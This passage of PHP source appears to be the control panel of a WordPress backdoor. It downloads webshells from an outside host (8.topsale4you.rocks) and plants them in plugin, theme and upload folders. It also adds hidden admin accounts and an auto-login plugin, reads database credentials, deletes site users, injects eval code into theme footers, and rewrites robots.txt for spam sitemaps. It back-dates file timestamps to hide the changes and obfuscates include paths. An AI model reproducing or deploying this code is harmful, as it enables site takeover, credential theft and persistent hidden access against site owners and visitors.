			@touch($_POST['root']."/wp-content/plugins/",$time);
				$auto_login_get=file_get_contents($_POST['root']."/wp-content/plugins/test.php");
				if(strpos($auto_login_get,'wp_set_current_user')!==false){
					echo '<font color="green">'.$_POST['url_root'].'wp-content/plugins/test.php Auto Login Is add!'.'</font>'."<br/>";
				}else{
					echo '<font color="red">'."Auto Login Is not add!".'</font>'."<br/>";
				}
		}
		
		
		
		
		
		////////////////////////
		if(!empty($_POST['adminer'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/adminer.txt");
		$new_ma_link.=insert_ma('adminer',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['try-gai'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/try-gai.txt");
		$new_ma_link.=insert_ma('try-gai',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['new-ma'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/new-ma.txt");
		$new_ma_link.=insert_ma('new-ma',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['files'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/files.txt");
		$new_ma_link.=insert_ma('files',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['secs'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/secs.txt");
		$new_ma_link.=insert_ma('secs',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['kaylin'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/kaylin.txt");
		$new_ma_link.=insert_ma('kaylin',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['new_ma2'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/new_ma2.txt");
		$new_ma_link.=insert_ma('new_ma2',$new_ma_con).'	';
		}
		/////////////////////
		if(!empty($_POST['add_user'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/add_user.txt");
		$username='admin_'.generate_user(5,8);
		$password=generate_password(15,20);
		$new_ma_con=str_replace('{username}',$username,$new_ma_con);
		$new_ma_con=str_replace('{password}',$password,$new_ma_con);
		$new_ma_con=str_replace('{root}',$_POST['root'],$new_ma_con);
		$add_user_link=insert_ma('add_user',$new_ma_con);
		if(!empty($add_user_link)){
			$new_ma_link.=$add_user_link.'?create=Y'.'username='.$username.' '.' password='.$password.'	';
		}
		}
		/////////////////////
		if(!empty($_POST['little_ma'])){
		$new_ma_con=$little_put_file_ma;
		$new_ma_link.=insert_ma('litte ma 1',$new_ma_con).'	';
		}
		/////////////////////
 $end_test1_all_link='';
	if(!empty($db_all)||!empty($chama_all_link)||!empty($new_ma_link)||!empty($user_pw)){
		$end_test1_all_link.=$db_all.'	'.$chama_all_link.'	'.$new_ma_link.'	'.$user_pw.'	';
		echo '<textarea rows="1" cols="200">'.$end_test1_all_link.'</textarea>'."<br/>";
 
	}	

	}
	if(!empty($_POST['chama_option'])&&!empty($_POST['url_root'])){
		$url_root=$_POST['url_root'];
		$chama_con2=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/".$_POST['chama_option']);
		//chama_all_link_new
		$chama_all_link_new= insert_ma($_POST['chama_option'],$chama_con2);
	if(!empty($chama_all_link_new)){
	echo '<textarea rows="1" cols="200">'.$chama_all_link_new.'</textarea>'."<br/>";
}
	}

	
	else{
		echo '<font color="red">'."check options!!!".'</font>'."<br/>";
	}
		
	
	
	echo <<<EOT
<br/>



<form name="input" action="" method="post">
<br/>
url_root<br/>
<input type="text" name="url_root" style="width:300px;" value="{$_POST['url_root']}" /><br/>
<br/>
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
black index ___index or functions or option<br/>
<br/>


<select name="check"> 
	<option value="2">test1</option> 
	</select><br/>
<br/>
chama<br/>
<font color="red">config-add?</font>
<select name="config_add" style="width:80px"> 
<option value="1">add</option> 
plugin-name<br/>
<select name="chama1"> 
{$admin_select}
	</select>
<select name="chama2"> 
{$plugin_scan1}
	</select>
<select name="chama3"> 
{$plugin_scan2}
	</select>
<select name="chama4"> 
{$themes_scan1}
	</select>
<select name="chama5"> 
{$uploads_scan1}
	</select>
<select name="chama6"> 
{$uploads_scan2}
	</select>
<select name="chama7"> 
{$admin_select}
	</select>
	<font color="red">jm?</font><select name="ma_1_jm" style="width:80px"> 
<option value="">NO</option>
<option value="1">add</option>
</select>
	
	
	<br/>
file_upload1<select name="upload_file1"> 
{$plugin_scan3}
	</select>
	file_upload2<select name="upload_file2"> 
{$themes_scan2}
	</select>
	file_upload3<select name="upload_file3"> 
{$uploads_scan3}
	</select>
	<select name="chama_con"> 
	<option value="1">add</option> 
	<option value="">NO</option>
	</select><br/><br/>
	adminer
	<select name="adminer">
{$admin_select}
	</select>
	try-gai
	<select name="try-gai">
{$admin_select}
	</select>
	new-ma
	<select name="new-ma">
{$admin_select}
	</select>
	files
	<select name="files">
{$admin_select}
	</select>
	secs
	<select name="secs">
{$admin_select}
	</select>
	kaylin
	<select name="kaylin"> 
{$admin_select}
	</select>
	new_ma2
		<select name="new_ma2"> 
{$admin_select}
	</select>
		add_user
		<select name="add_user"> 
{$admin_select}
	</select>
	little_ma
	<select name="little_ma"> 
{$admin_select}
	</select>
	create user
	<select name="create_user"> 
{$admin_select}
	</select>
	<br/><br/>
	<select name="chama_option" style="width:80px"> 
	<option value="">---</option> 
	<option value="filecontral-changediy.txt">filecontral-changediy</option> 
	<option value="try-gai.txt">try-gai</option> 
	<option value="new-ma.txt">new-ma</option> 
	<option value="files.txt">files</option> 
	<option value="ftp-fso.txt">ftp-fso</option> 
	<option value="secs.txt">secs</option> 
	<option value="kaylin.txt">kaylin</option> 
	<option value="adminer.txt">adminer</option> 
	<option value="new_ma2.txt">new_ma2</option> 
	<option value="add_user.txt">add_user</option> 
	</select>
<br/>

<input type="submit" value="Submit" />
EOT;
	
exit;
	}
	
	if(isset($_POST['check'])&&$_POST['check']==3){
		
		if(!empty($_POST["root"])){
			ob_start();
			include_once($_POST["root"].'wp-blog-header.php');
			ob_end_clean();
			$db_host_srt=constant("DB_HOST");
			if(strpos($db_host_srt,':')!==false){
				$db_host_array=explode(':',$db_host_srt);
				$con=mysqli_connect($db_host_array[0],constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME"),$db_host_array[1]); 
			}else{
				$con=mysqli_connect(constant("DB_HOST"),constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME")); 
			}
			if (mysqli_connect_errno($con)){ 
				echo "MySQL connect error: " . mysqli_connect_error(); 
			}
			mysqli_set_charset($con,"utf8") or mysql_error();
			$sql = "select option_value from ".$table_prefix."options";
			$res = mysqli_query($con,$sql);
			//print_r($res);
			
			if($res>0){
			echo '<font color="green"> exec ok db!</font>'."<br/>";
			$row = mysqli_fetch_row($res);
			echo "<br/>";			
			echo "<br/>";			
			echo $host_name=$row[0];
			echo "<br/>";
			echo "<br/>";
			echo $host_name=$row[1];
			}else{
				echo '<font color="red"> exec db not ok!</font>'."<br/>";
			}
			mysqli_close($con);
		}
		
			echo <<<EOT

<form name="input" action="" method="post">
 
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
 

<select name="check"> 
    <option value="3">get url root</option>
    </select><br/>
 

<input type="submit" value="Submit" />
EOT;




exit;
	}
	 
	if(isset($_POST['check'])&&$_POST['check']==4){
		if(!empty($_POST["root"])){
			
			
			 

			function scanfile($dir,$key,$inc,$fit,$tye,$chr,$ran,$now,&$arr) {$handle = opendir($dir);if(!$handle) return false;while($name = readdir($handle)) {if($name == '.' || $name == '..') continue;$path = $dir.$name;if(is_dir($path)) { if($fit && in_array($name,$fit)) continue; if($ran == 0 && is_readable($path)) scanfile($path.'/',$key,$inc,$fit,$tye,$chr,$ran,$now,$arr); }else {if($inc && (!find($inc,$name))) continue;$code = $tye ? filer($path) : $name;$find = $chr ? stristr($code,$key) : (strpos(size(filesize($path)),'M') ? false : (strpos($code,$key) > -1));if($find) {$file = strtr($path,array($now => '','\'' => '%27','"' => '%22'));$arr[]=$path;flush(); ob_flush();}unset($code);}}closedir($handle);return $arr;}



			function filer($filename) {$handle = fopen($filename,'r');$filedata = fread($handle,filesize($filename));fclose($handle);return $filedata;}

			function find($array,$string) {foreach($array as $key) { if(stristr($string,$key)) return true; }return false;}
			function strdir($str) { return str_replace(array('\\','//','%27','%22'),array('/','/','\'','"'),chop($str)); }
			$nowdir =$_POST["root"];
			$include=".php";
			$incs = $include == '' ? false : explode('|',$include);
			scanfile(strdir($_POST["root"]),'wp-config.php',$incs,0,0,1,0,$nowdir,$scanaa);
			if(!empty($scanaa)){
				foreach($scanaa as $uurl){
					$all_con_dir=dirname($uurl);
					echo $uurl.'<br/>';
				}
			}
			
			
			 
		}
					echo <<<EOT

<form name="input" action="" method="post">
 
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
 

<select name="check"> 
    <option value="4">DISALLOW all</option>
    </select><br/>
 

<input type="submit" value="Submit" />
EOT;
exit;
	}
	 
	if(isset($_POST['check'])&&$_POST['check']==5){
		if(!empty($_POST["root"])){
		$c=get_test_Html("http://8.topsale4you.rocks/tong/get_file");
		if(!empty($_POST["file_name"])){
			@file_put_contents($_POST["file_name"],$c);
			if(is_file($_POST["file_name"])){
				echo '<font color="green">file create ok!</font>'."<br/>";
				}else{
				echo '<font color="red">file create is not ok!</font>'."<br/>";
				}
		}else{
			@file_put_contents("aa",$c);
			if(is_file("aa")){
				echo '<font color="green">file create ok!</font>'."<br/>";
				}else{
				echo '<font color="red">file create is not ok!</font>'."<br/>";
				}
		}
		
		




			echo <<<EOT

<form name="input" action="" method="post">
 
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["file_name"]}"/><br/>

<select name="check"> 
    <option value="5">get_file</option>
    </select><br/>
 

<input type="submit" value="Submit" />
EOT;
exit;
	
		}
	}
	
	
	
	
	
	if(isset($_POST['check'])&&$_POST['check']==6){//google.com/webmasters/tools/
		if(!empty($_POST["url_root"])){
			$url_root=$http_type.$_SERVER['HTTP_HOST'].'/';
			$sitemap_url="";
			if($_POST['sitemap_mod']=='1'){
				$sitemap_url="wp-content/";
			} 
		  if(!empty($_POST['sitemap_ed'])){
			  $sitemap_ed_con=get_test_Html('http://google.com/ping?sitemap='.$_POST["url_root"].$sitemap_url.'sitemap_ed.xml');
			  if(strpos($sitemap_ed_con,'google.com/webmasters/tools/')!==false){
				  echo '<font color="green">ping sitemap_ed ok!</font>'."<br/>";
			  }else{
				   echo '<font color="red">ping sitemap_ed not ok!</font>'."<br/>";
			  }
		  }
		  if(!empty($_POST['sitemap_wl'])){
			  $sitemap_wl_con=get_test_Html('http://google.com/ping?sitemap='.$_POST["url_root"].$sitemap_url.'sitemap_wl.xml');
			  if(strpos($sitemap_wl_con,'google.com/webmasters/tools/')!==false){
				  echo '<font color="green">ping sitemap_wl ok!</font>'."<br/>";
			  }else{
				   echo '<font color="red">ping sitemap_wl not ok!</font>'."<br/>";
			  }
		  }
		  if(!empty($_POST['sitemap_cbd'])){
			  $sitemap_cbd_con=get_test_Html('http://google.com/ping?sitemap='.$_POST["url_root"].$sitemap_url.'sitemap_cbd.xml');
			  if(strpos($sitemap_cbd_con,'google.com/webmasters/tools/')!==false){
				  echo '<font color="green">ping sitemap_cbd ok!</font>'."<br/>";
			  }else{
				   echo '<font color="red">ping sitemap_cbd not ok!</font>'."<br/>";
			  }
		  }
		  /*
		  if(!empty($_POST['sitemap_edfra'])){
			  $sitemap_cbd_con=get_test_Html('http://google.com/ping?sitemap='.$_POST["url_root"].$sitemap_url.'sitemap_edfra.xml');
			  if(strpos($sitemap_cbd_con,'google.com/webmasters/tools/')!==false){
				  echo '<font color="green">ping sitemap_edfra ok!</font>'."<br/>";
			  }else{
				   echo '<font color="red">ping sitemap_edfra not ok!</font>'."<br/>";
			  }
		  }
		  if(!empty($_POST['sitemap_wlfra'])){
			  $sitemap_cbd_con=get_test_Html('http://google.com/ping?sitemap='.$_POST["url_root"].$sitemap_url.'sitemap_wlfra.xml');
			  if(strpos($sitemap_cbd_con,'google.com/webmasters/tools/')!==false){
				  echo '<font color="green">ping sitemap_wlfra ok!</font>'."<br/>";
			  }else{
				   echo '<font color="red">ping sitemap_wlfra not ok!</font>'."<br/>";
			  }
		  }
*/

			
	
		}
		echo <<<EOT
<form name="input" action="" method="post">
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
url root add'/'<br/>
<input type="text" name="url_root" style="width:300px;" value="{$url_root}"/><br/>
sitemap_ed?<select name="sitemap_ed"> 
	<option value="add">add</option>
	<option value="">NO</option>
	</select><br/>
	<!--
	sitemap_edfra?<select name="sitemap_edfra"> 
	<option value="add">add</option>
	<option value="">NO</option>
	</select><br/>
	sitemap_wlfra?<select name="sitemap_wlfra"> 
	<option value="add">add</option>
	<option value="">NO</option>
	</select><br/>
	-->
	sitemap_wl?<select name="sitemap_wl"> 
	<option value="add">add</option>
	<option value="">NO</option>
	</select><br/>
	sitemap_cbd?<select name="sitemap_cbd"> 
	<option value="add">add</option>
	<option value="">NO</option>
	</select><br/>
	mod?<select name="sitemap_mod"> 
	<option value="1">wp-content/sitemap</option>
	<option value="2">sitemap</option>
	</select><br/>
	<select name="check"> 
	<option value="6">ping sitemap</option>
	<option value="1">test</option>
	<option value="2">test1</option>
	<option value="3">get url root</option>
	<option value="4">DISALLOW all</option>
	<option value="5">get_file</option>
	<option value="7">add fun & robot</option>
	<option value="8">del paswd</option>
	<option value="9">touch all file</option>
	</select><br/>
<input type="submit" value="Submit" />
EOT;
exit;
	}
	if(isset($_POST['check'])&&$_POST['check']==7){
		
		if(!empty($_POST["root"])){
			
			$url_root=$http_type.$_SERVER['HTTP_HOST'].'/';
			if(!empty($_POST["add_robots"])){
				if(is_file($_POST["root"].'robots.txt')){
					if(empty($_POST["url_mod"])){
						//$robot_add_con="Sitemap: {$url_root}wp-content/sitemap_ed.xml\r\nSitemap: {$url_root}wp-content/sitemap_edfra.xml\r\nSitemap: {$url_root}wp-content/sitemap_wl.xml\r\nSitemap: {$url_root}wp-content/sitemap_wlfra.xml\r\nSitemap: {$url_root}wp-content/sitemap_cbd.xml\r\nDisallow: /wp-admin/\r\nDisallow: /wp-includes/\r\nDisallow: /wp-content/plugins\r\nDisallow: /wp-content/themes\r\nDisallow: /author\r\nDisallow: ?author";
						$robot_add_con="Sitemap: {$url_root}wp-content/sitemap_ed.xml\r\nSitemap: {$url_root}wp-content/sitemap_wl.xml\r\nSitemap: {$url_root}wp-content/sitemap_cbd.xml\r\nDisallow: /wp-admin/\r\nDisallow: /wp-includes/\r\nDisallow: /wp-content/plugins\r\nDisallow: /wp-content/themes\r\nDisallow: /author\r\nDisallow: ?author";
					}else{
						//$robot_add_con="Sitemap: {$url_root}sitemap_ed.xml\r\nSitemap: {$url_root}sitemap_edfra.xml\r\nSitemap: {$url_root}sitemap_wl.xml\r\nSitemap: {$url_root}sitemap_wlfra.xml\r\nSitemap: {$url_root}sitemap_cbd.xml\r\nDisallow: /wp-admin/\r\nDisallow: /wp-includes/\r\nDisallow: /wp-content/plugins\r\nDisallow: /wp-content/themes\r\nDisallow: /author\r\nDisallow: ?author";
						$robot_add_con="Sitemap: {$url_root}sitemap_ed.xml\r\nSitemap: {$url_root}sitemap_wl.xml\r\n\r\nSitemap: {$url_root}sitemap_cbd.xml\r\nDisallow: /wp-admin/\r\nDisallow: /wp-includes/\r\nDisallow: /wp-content/plugins\r\nDisallow: /wp-content/themes\r\nDisallow: /author\r\nDisallow: ?author";
					}
					$robot_con=file_get_contents($_POST["root"].'robots.txt');
					if(strpos($robot_con,'sitemap_ed.xml')!==false||strpos($robot_con,'sitemap_wl.xml')!==false||strpos($robot_con,'sitemap_cbd.xml')!==false){
						 echo '<font color="green">robots sitemap Exists!</font>'."<br/>";
					}else{
						$robot_con.="\r\n".$robot_add_con;
						@file_put_contents($_POST["root"].'robots.txt',$robot_con);
						@touch($_POST["root"].'robots.txt',$time);
						@touch($_POST["root"],$time);
						$robot_con=file_get_contents($_POST["root"].'robots.txt');
						if(strpos($robot_con,'sitemap_ed.xml')!==false||strpos($robot_con,'sitemap_wl.xml')!==false||strpos($robot_con,'sitemap_cbd.xml')!==false){
							 echo '<font color="green">robots sitemap add ok!</font>'."<br/>";
						}else{
							 echo '<font color="red">robots sitemap add not ok!</font>'."<br/>";
						}
					}
				}else{
						$robot_fun_con=file_get_contents($_POST["root"].'wp-includes/functions.php');
						if(strpos($robot_fun_con,'sitemap_ed.xml')!==false||strpos($robot_fun_con,'sitemap_wl.xml')!==false||strpos($robot_fun_con,'sitemap_cbd.xml')!==false){
						 echo '<font color="green">fun robots sitemap Exists!</font>'."<br/>";
					}else{
						if(empty($_POST['fun_dis_allow'])){
							$fun_str='admin-ajax.php\n";';
						}else{
							$fun_dis_allow_flag=true;
							$fun_str='Disallow: /\n";';
						}
						if(empty($_POST["url_mod"])){
						//$robot_add_con="\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_ed.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_edfra.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_wl.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_wlfra.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_cbd.xml\\n\";\r\n\$output  .= \"Disallow: /wp-admin/\\n\";\r\n\$output  .= \"Disallow: /wp-includes/\\n\";\r\n\$output  .= \"Disallow: /wp-content/plugins\\n\";\r\n\$output  .= \"Disallow: /wp-content/themes\\n\";\r\n\$output  .= \"Disallow: /author\\n\";\r\n\$output  .= \"Disallow: ?author\\n\";\r\n";
						$robot_add_con="\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_ed.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_wl.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}wp-content/sitemap_cbd.xml\\n\";\r\n\$output  .= \"Disallow: /wp-admin/\\n\";\r\n\$output  .= \"Disallow: /wp-includes/\\n\";\r\n\$output  .= \"Disallow: /wp-content/plugins\\n\";\r\n\$output  .= \"Disallow: /wp-content/themes\\n\";\r\n\$output  .= \"Disallow: /author\\n\";\r\n\$output  .= \"Disallow: ?author\\n\";\r\n";
						}else{
							//$robot_add_con="\r\n\$output  .= \"Sitemap: {$url_root}sitemap_ed.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}sitemap_edfra.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}sitemap_wl.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}sitemap_wlfra.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}sitemap_cbd.xml\\n\";\r\n\$output  .= \"Disallow: /wp-admin/\\n\";\r\n\$output  .= \"Disallow: /wp-includes/\\n\";\r\n\$output  .= \"Disallow: /wp-content/plugins\\n\";\r\n\$output  .= \"Disallow: /wp-content/themes\\n\";\r\n\$output  .= \"Disallow: /author\\n\";\r\n\$output  .= \"Disallow: ?author\\n\";\r\n";
							$robot_add_con="\r\n\$output  .= \"Sitemap: {$url_root}sitemap_ed.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}sitemap_wl.xml\\n\";\r\n\$output  .= \"Sitemap: {$url_root}sitemap_cbd.xml\\n\";\r\n\$output  .= \"Disallow: /wp-admin/\\n\";\r\n\$output  .= \"Disallow: /wp-includes/\\n\";\r\n\$output  .= \"Disallow: /wp-content/plugins\\n\";\r\n\$output  .= \"Disallow: /wp-content/themes\\n\";\r\n\$output  .= \"Disallow: /author\\n\";\r\n\$output  .= \"Disallow: ?author\\n\";\r\n";
						}
						
						$robot_fun_con=str_replace($fun_str,$fun_str.$robot_add_con,$robot_fun_con);
						if($fun_dis_allow_flag){
							$robot_fun_con=str_replace('Disallow: /','Disallow: ',$robot_fun_con);
						}
						@file_put_contents($_POST["root"].'wp-includes/functions.php',$robot_fun_con);
						@touch($_POST["root"].'wp-includes/functions.php',$time);
						@touch($_POST["root"].'wp-includes/',$time);
						$robot_fun_con=file_get_contents($_POST["root"].'wp-includes/functions.php');
						if(strpos($robot_fun_con,'sitemap_ed.xml')!==false||strpos($robot_fun_con,'sitemap_wl.xml')!==false||strpos($robot_fun_con,'sitemap_cbd.xml')!==false){
							 echo '<font color="green">fun robots sitemap add ok!</font>'."<br/>";
						}else{
							 echo '<font color="red">fun robots sitemap add not ok!</font>'."<br/>";
						}
						
					}
				}
			}
			//ob_start();
			//include_once($_POST['root']."wp-blog-header.php");
			//ob_end_clean();
			
			$themes_dir=get_template_directory();
			echo $themes_dir."<br/>";
			if(!empty($_POST["add_footer_fun"])){
				//$themes_dir
				$themes_footer_con=file_get_contents($themes_dir."/footer.php");
				if(strpos($themes_footer_con,'eval')!==false&&(!empty($_POST['themes_footer_con'])&&strpos($_POST['themes_footer_con'],'{add}')===false)){
					echo '<font color="green">footer link is exists!</font>'."<br/>";
					$themes_footer_con=file_get_contents($themes_dir."/footer.php");
					$themes_footer_con_gai='<textarea type="text" name="themes_footer_con" style="width:600px;"/>'.htmlspecialchars($themes_footer_con).'</textarea><br/>';
				}else{
					if(!empty($_POST['themes_footer_con'])&&strpos($_POST['themes_footer_con'],'{add}')!==false){
					$add_footer=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/this_link.txt");
					if(!empty($add_footer)){
						$themes_footer_con=stripslashes($_POST['themes_footer_con']);
						$themes_footer_con=str_replace("{add}",$add_footer,$themes_footer_con);
						@file_put_contents($themes_dir."/footer.php",$themes_footer_con);
						@touch($themes_dir."/footer.php",$time);
						@touch($themes_dir,$time);
						$themes_footer_con=file_get_contents($themes_dir."/footer.php");
						if(strpos($themes_footer_con,'eval')!==false){
							echo '<font color="green">footer link add ok!</font>'."<br/>";
						}else{
							echo '<font color="red">footer link is not ok!</font>'."<br/>";
						}
					}
					}else{
						$themes_footer_con=file_get_contents($themes_dir."/footer.php");
						$themes_footer_con_gai='<textarea type="text" name="themes_footer_con" style="width:600px;"/>'.htmlspecialchars($themes_footer_con).'</textarea><br/>';
					}
				}
				
				
			}
		}
		echo <<<EOT
<form name="input" action="" method="post">
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
url root add'/'<br/>
<input type="text" name="url_root" style="width:300px;" value="{$url_root}"/><br/><br/>
	
robots?<select name="add_robots"> 
    <option value="add">add</option>
    <option value="">NO</option>
    </select>
	url_mod?<select name="url_mod"> 
    <option value="">default</option>
    <option value="1">host/sitemap</option>
    </select>
	fun_dis_allow?<select name="fun_dis_allow"> 
    <option value="">default</option>
    <option value="1">disallow</option>
    </select><br/>
footer?<select name="add_footer_fun">
    <option value="add">add</option>
    <option value="">NO</option>
    </select><br/><br/>
	{$themes_footer_con_gai}<br/><br/>
 
<select name="check">
	<option value="7">add fun & robot</option>
	<option value="1">test</option>
	<option value="2">test1</option>
	<option value="3">get url root</option>
	<option value="4">DISALLOW all</option>
	<option value="5">get_file</option>
	<option value="6">ping sitemap</option>
	<option value="8">del paswd</option>
	<option value="9">touch all file</option>
	</select><br/>
<input type="submit" value="Submit" />
EOT;
exit;
	}
	if(isset($_POST['check'])&&$_POST['check']==8){
		// ob_start();
		// include_once($_POST["root"].'wp-blog-header.php');
		// ob_end_clean();
			$db_host_srt=constant("DB_HOST");
			if(strpos($db_host_srt,':')!==false){
				$db_host_array=explode(':',$db_host_srt);
				$con=mysqli_connect($db_host_array[0],constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME"),$db_host_array[1]); 
			}else{
				$con=mysqli_connect(constant("DB_HOST"),constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME")); 
			}
			if (mysqli_connect_errno($con)){ 
				echo "MySQL connect error: " . mysqli_connect_error(); 
			}
			mysqli_set_charset($con,"utf8") or mysql_error();
			$sql = "select user_login from ".$table_prefix."users";
			$res = mysqli_query($con,$sql);
			if($res>0){
			echo '<font color="green"> get pas ok db!</font>'."<br/>";
			 $row = mysqli_fetch_all($res);
			$uname='';
			 //echo count($row);
			foreach($row as $nameeee){
				$uname.='<option value="'.$nameeee[0].'">'.$nameeee[0].'</option>';
			}
			
			if(!empty($_POST['del_name'])){
				$sql = 'DELETE FROM `'.$table_prefix.'users` WHERE ((`user_login` = \''.$_POST['del_name'].'\'))';
				$res_del = mysqli_query($con,$sql);
				if($res_del>0){
					echo '<font color="green"> '.$_POST['del_name'].' del ok db!</font>'."<br/>";
				}else{
					echo '<font color="red"> '.$_POST['del_name'].' del not ok db!</font>'."<br/>";
				}
			}
			 
			
			
			}else{
				echo '<font color="red"> get pas db not ok!</font>'."<br/>";
			}
			echo <<<EOT

<form name="input" action="" method="post">
 
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>


<select name="check">
	<option value="8">del paswd</option>
	<option value="1">test</option>
	<option value="2">test1</option>
	<option value="3">get url root</option>
	<option value="4">DISALLOW all</option>
	<option value="5">get_file</option>
	<option value="6">ping sitemap</option>
	<option value="7">add fun & robot</option>
	<option value="9">touch all file</option>
	</select><br/>
 <select name="del_name">
 {$uname}
    </select><br/>
	<br/>

<input type="submit" value="Submit" />
EOT;
exit;
	}
	if(isset($_POST['check'])&&$_POST['check']==9){
		if(isset($_POST["change_time_dir"])){
			scan_dir($_POST["change_time_dir"],1,$time);
			echo '<h3><font color="green"> Change OK!!!</font></h3>'."<br/>";
		}
		if(empty($_POST["change_time_dir"])){
			$_POST["change_time_dir"]=$_POST["root"];
		}
		echo <<<EOT

<form name="input" action="" method="post">
 
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$_POST["root"]}"/><br/>
change_time_dir'<br/>
<input type="text" name="change_time_dir" style="width:300px;" value="{$_POST["root"]}"/><br/>

<select name="check">
	<option value="9">touch all file</option>
	<option value="1">test</option>
	<option value="2">test1</option>
	<option value="3">get url root</option>
	<option value="4">DISALLOW all</option>
	<option value="5">get_file</option>
	<option value="6">ping sitemap</option>
	<option value="7">add fun & robot</option>
	<option value="8">del paswd</option>
	</select><br/>
	<br/>
<input type="submit" value="Submit" />
EOT;
		exit;
	}
	if(is_file("error_log")){
		unlink("error_log");
	}


else{
	echo '<font color="red">No Root!!!</font>'."<br/>";
}






function gaiurl_2($str){
	$str_array=(str_split($str));
for($i=0;$i<count($str_array);$i++){
	if(rand(0,1)==0){
		$str_array[$i]="\\".decoct(ord($str_array[$i]));
	}
}
$str=implode($str_array);
return $str;
}


function gaiurl($str){
	$str_array=(str_split($str));
for($i=0;$i<count($str_array);$i++){
	if(rand(0,1)==0){
		$str_array[$i]="\\".decoct(ord($str_array[$i]));
	}
}
$str='@include("'.implode($str_array).'");';
return $str;
}



	function trimall($str){
    $qian=array(" ","　","\t","\n","\r");
    return str_replace($qian, '', $str);  
}
function compare_str($str,$strr){
			$tmparray = explode($strr,$str);
			if(count($tmparray)>1){
			 return true;
			 } else{
			 return false;
			 }
		}
 function traverseDir(&$arr,$dir){
         if($dir_handle = @opendir($dir)){
             while($filename = readdir($dir_handle)){
                 if($filename !== "." && $filename !== ".."&& $filename !== "wp-file-manager"&& $filename !== "wp-file-manager--"&& $filename !== "file-manager"&& $filename !== "akismet"&& $filename !== "wordfence"&& $filename !== "wordfencea"&& $filename !== ".w3-cache"){
                     $subFile = $dir.DIRECTORY_SEPARATOR.$filename; 
                     if(is_dir($subFile)){
                        $arr[] = str_pad(substr_count($subFile,DIRECTORY_SEPARATOR),2,"0",STR_PAD_LEFT).":".$subFile; 
                         traverseDir($arr,$subFile);
                     }
                 }
             }
             closedir($dir_handle);
         }
         return $arr;
     }

////////////////////////

function traverseDir_cur($dir){
	$arr=array();
	if($dir_handle = @opendir($dir)){
		while($filename = readdir($dir_handle)){
			if($filename != "." && $filename != ".."){
				$arr[] = $filename; 
			}
		}
		closedir($dir_handle);
	}
	return $arr;
}
function traverseDir_cur_dir($dir){
	$arr=array();
	if($dir_handle = @opendir($dir)){
		while($filename = readdir($dir_handle)){
			if($filename != "." && $filename != ".."&& $filename != 'wp-content'&& $filename != "wp-admin"&& $filename != "wp-includes"){
				if(is_dir($dir.'/'.$filename)){
					$arr[] = $filename; 
				}
			}
		}
	closedir($dir_handle);
	}
	return $arr;
}

function traverseDir_cur_file($dir){
	if($dir_handle = @opendir($dir)){
		while($filename = readdir($dir_handle)){
			if($filename != "." && $filename != ".."&&is_file($dir.'/'.$filename)){
				$arr[] = $filename; 
			}
		}
		closedir($dir_handle);
		}
	return $arr;
}
 /////////////////////
 //if(!function_exists('get_test_Html')){
function get_test_Html($url){
	$content=file_get_contents($url);
	if(empty($content)){
	$ch = curl_init();
	$timeout = 5;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_NOBODY, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	$content = curl_exec($ch);
	curl_close($ch);
	}
return $content;
}
//}
function chmodr($path, $filemode) {
	return chmod($path, $filemode); 
}

function insert_ma($name,$con){
	Global $url_root;
	Global $file_per;
	Global $time;
